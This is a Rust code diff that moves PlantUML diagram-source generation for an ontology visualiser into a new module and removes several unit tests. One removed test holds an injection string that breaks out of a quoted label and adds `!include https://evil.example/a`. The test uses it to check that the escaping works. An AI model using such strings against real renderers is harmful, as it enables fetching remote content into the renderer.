@@ -1,10 +1,9 @@
 //! A local engine projection retained beside its exact semantic input.
 use {
-    super::Diagram,
+    super::{Diagram, plantuml_source::PlantUmlSource},
     crate::publication::{document::plantuml::LocalRenderer, image_assets},
     anyhow::{Result, ensure},
     serde::{Deserialize, Serialize},
-    std::collections::BTreeMap,
 };
 
 #[derive(Clone, Debug, Serialize, Deserialize)]
@@ -20,7 +19,7 @@ impl Projection {
         diagram: Diagram,
         renderer: &LocalRenderer,
     ) -> Result<Self> {
-        let mut source = source(&diagram);
+        let mut source = PlantUmlSource::new(&diagram).render();
         let engine = renderer.version().await?;
         let mut svg = render(renderer, &source).await?;
         if !diagram.edges.is_empty() &&
@@ -102,236 +101,6 @@ fn layout_score(svg: &str) -> Result<f64> {
     Ok(scale * (width / height).min(1.0))
 }
 
-pub(super) fn nodes(diagram: &Diagram) -> BTreeMap<&str, &super::Node> {
-    diagram
-        .nodes()
-        .map(|node| (node.id.as_str(), node))
-        .collect() // bounded: at most thirty-seven nodes.
-}
-fn source(diagram: &Diagram) -> String {
-    let nodes = nodes(diagram);
-    let shorthand = super::shorthand::Shorthand::new(diagram);
-    let layout = super::layout::Layout::new(diagram);
-    let mut visible = shorthand.visible.clone();
-    for (class, field) in super::constraint_projection::properties(diagram) {
-        visible.insert(class.id.as_str());
-        if field.object &&
-            let Some(range) = field.range
-        {
-            visible.insert(range.id.as_str());
-        }
-    }
-    let mut identifiers = BTreeMap::new(); // bounded: at most thirty-seven node IDs.
-    let mut output =
-        "@startuml\n!pragma layout smetana\nallowmixing\nleft to right \
-         direction\nhide empty members\nhide circle\nskinparam shadowing \
-         false\nskinparam backgroundColor transparent\nskinparam \
-         defaultFontName Arial\nskinparam defaultFontSize 14\nskinparam \
-         ArrowColor #68758A\nskinparam nodesep 30\nskinparam ranksep 45\n"
-            .to_owned();
-    identifiers
-        .extend(nodes.keys().enumerate().map(|(index, id)| (*id, index)));
-    if layout.has_hierarchy() {
-        output = output.replacen(
-            "left to right direction",
-            "top to bottom direction",
-            1,
-        );
-    }
-    for (index, node) in nodes.values().enumerate() {
-        if !visible.contains(node.id.as_str()) {
-            continue;
-        }
-        let color = if node.id == diagram.focus.id {
-            "#E9EDFF"
-        } else if node.kind.contains("property") {
-            "#FFF5E9"
-        } else {
-            "#FFFFFF"
-        };
-        let label = if node.kind == "OWL union" {
-            let mut members = diagram
-                .edges
-                .iter()
-                .filter(|edge| {
-                    edge.from.id == node.id &&
-                        edge.predicate.as_deref() ==
-                            Some(super::union_domain::UNION)
-                })
-                .map(|edge| edge.to.label.as_str())
-                .collect::<Vec<_>>(); // bounded: eight complete union members.
-            members.sort_unstable();
-            label(&members.join(" or "))
-        } else {
-            label(&node.label)
-        };
-        // Opaque links resolve after layout; source URLs never enter PlantUML.
-        if node.kind == "Class" {
-            output.push_str(&format!(
-                "class \"{label}\" as n{index} <<owl:Class>> \
-                 [[./grapharch-node/n{index}]] {color} {{\n"
-            ));
-            for property in shorthand.properties.iter().filter(|p| {
-                p.attribute() &&
-                    p.domain.id == node.id &&
-                    !super::constraint_projection::constrained(
-                        diagram, &node.id, &p.node.id,
-                    )
-            }) {
-                let property_index = nodes
-                    .keys()
-                    .position(|id| *id == property.node.id)
-                    .expect("retained property node");
-                let range = property
-                    .range
-                    .filter(|range| {
-                        range.id != super::shorthand::GENERIC_RESOURCE
-                    })
-                    .map(|r| format!(" : {}", text(&r.label)))
-                    .unwrap_or_default();
-                output.push_str(&format!(
-                    "  {{field}} {}{range} \
-                     [[[./grapharch-node/n{property_index}]]]\n",
-                    text(&property.node.label)
-                ));
-            }
-            for existence in shorthand
-                .existences
-                .iter()
-                .filter(|e| e.class.id == node.id)
-            {
-                existence.write(
-                    &mut output,
-                    &identifiers,
-                    &shorthand.qualified_counts,
-                );
-            }
-            super::qualified_count::QualifiedCount::members(
-                &mut output,
-                node,
-                &shorthand.qualified_counts,
-                &identifiers,
-            );
-            super::constraint_projection::members(
-                &mut output,
-                node,
-                diagram,
-                &identifiers,
-            );
-            output.push_str("}\n");
-        } else if node.kind == "OWL union" {
-            output.push_str(&format!(
-                "rectangle \"{label}\" as n{index} \
-                 [[./grapharch-node/n{index}]] {color}\n"
-            ));
-        } else {
-            output.push_str(&format!(
-                "rectangle \"<<{}>>\\n{label}\" as n{index} \
-                 [[./grapharch-node/n{index}]] {color}\n",
-                text(&node.kind)
-            ));
-        }
-    }
-    if !shorthand.range_only.is_empty() {
-        output.push_str(
-            "class \"rdfs:Resource\" as unknownDomain \
-             #white;line:gray;line.dotted\n",
-        );
-        for property in &shorthand.range_only {
-            output.push_str(&format!(
-                "unknownDomain ..> n{} [[./grapharch-node/n{}]] : {}\n",
-                identifiers[property.range.id.as_str()],
-                identifiers[property.property.id.as_str()],
-                label(&property.property.label)
-            ));
-        }
-    }
-    for property in shorthand.properties.iter().filter(|p| !p.attribute()) {
-        let range = property.range.expect("association has a declared range");
-        output.push_str(&format!(
-            "n{} {} {}n{} [[./grapharch-node/n{}]] : {}\n",
-            identifiers[property.domain.id.as_str()],
-            layout.association_arrow(&property.domain.id, &range.id),
-            super::constraint_projection::association_count(
-                diagram,
-                &property.domain.id,
-                &property.node.id,
-                &range.id
-            ),
-            identifiers[range.id.as_str()],
-            identifiers[property.node.id.as_str()],
-            label(&property.node.label)
-        ));
-    }
-    super::constraint_projection::associations(
-        &mut output,
-        diagram,
-        &identifiers,
-        |class, field| {
-            shorthand.properties.iter().any(|p| {
-                !p.attribute() &&
-                    p.domain.id == class &&
-                    p.node.id == field.property.id &&
-                    p.range.map(|r| r.id.as_str()) ==
-                        field.range.as_ref().map(|r| r.id.as_str())
-            })
-        },
-    );
-    for minimum in &shorthand.qualified_counts {
-        minimum.write(&mut output, &identifiers, &layout);
-    }
-    for existential in &shorthand.existentials {
-        output.push_str(&format!(
-            "n{} {} \"1..*\" n{} [[./grapharch-node/n{}]] : \
-             {}\\n{{qualified}}\n",
-            identifiers[existential.class.id.as_str()],
-            layout.association_arrow(
-                &existential.class.id,
-                &existential.filler.id
-            ),
-            identifiers[existential.filler.id.as_str()],
-            identifiers[existential.property.id.as_str()],
-            label(&existential.property.label),
-        ));
-    }
-    for (index, edge) in diagram.edges.iter().enumerate() {
-        if shorthand.consumed.contains(&index) {
-            continue;
-        }
-        let generalization = super::layout::is_generalization(edge);
-        output.push_str(&format!(
-            "n{} {} n{}{}\n",
-            identifiers[edge.from.id.as_str()],
-            if generalization {
-                layout.generalization_arrow(edge)
-            } else {
-                layout.relation_arrow(edge)
-            },
-            identifiers[edge.to.id.as_str()],
-            if generalization {
-                String::new()
-            } else {
-                format!(" : {}", label(&edge.relation))
-            }
-        ));
-    }
-    output.push_str("@enduml\n");
-    output
-}
-pub(super) fn label(value: &str) -> String { super::label_lines::render(value) }
-pub(super) fn text(value: &str) -> String {
-    let mut output = String::new();
-    for character in value.chars() {
-        if character.is_alphanumeric() ||
-            matches!(character, ' ' | ':' | '-' | '.')
-        {
-            output.push(character);
-        } else {
-            output.push_str(&format!("<U+{:04X}>", character as u32));
-        }
-    }
-    output
-}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -343,7 +112,7 @@ mod tests {
                 focus:   super::super::Node {
                     id:    "urn:test:class".into(),
                     label: "Class".into(),
-                    kind:  "Class".into(),
+                    kind:  super::super::NodeKind::Class,
                     link:  None,
                 },
                 edges:   Vec::new(),
@@ -383,37 +152,5 @@ mod tests {
         assert!(
             layout_score(landscape).unwrap() > layout_score(portrait).unwrap()
         );
-    }
-    #[test]
-    fn authored_phrase_labels_wrap_at_words() {
-        assert_eq!(
-            label("legally delegated authority"),
-            "legally delegated\\nauthority"
-        );
-        assert_eq!(
-            label("delegates control to"),
-            "delegates control to"
-        );
-    }
-    #[test]
-    fn long_labels_wrap_without_discarding_identifier_characters() {
-        let wrapped = label("InformationSensitivityClassification");
-        assert!(wrapped.contains("\\n"));
-        assert_eq!(
-            wrapped.replace("\\n", ""),
-            "InformationSensitivityClassification"
-        );
-        assert_eq!(label("rdfs:subClassOf"), "rdfs:\\nsubClassOf");
-    }
-    #[test]
-    fn source_text_cannot_inject_plantuml_or_creole_directives() {
-        let malicious =
-            "\"\n@enduml\n!include https://evil.example/a\n<img:x>[[x]]\\n";
-        let encoded = text(malicious);
-        assert!(!encoded.contains('\n'));
-        assert!(!encoded.contains('"'));
-        assert!(!encoded.contains("!include"));
-        assert!(!encoded.contains("<img:"));
-        assert!(!encoded.contains("[["));
     }
 }
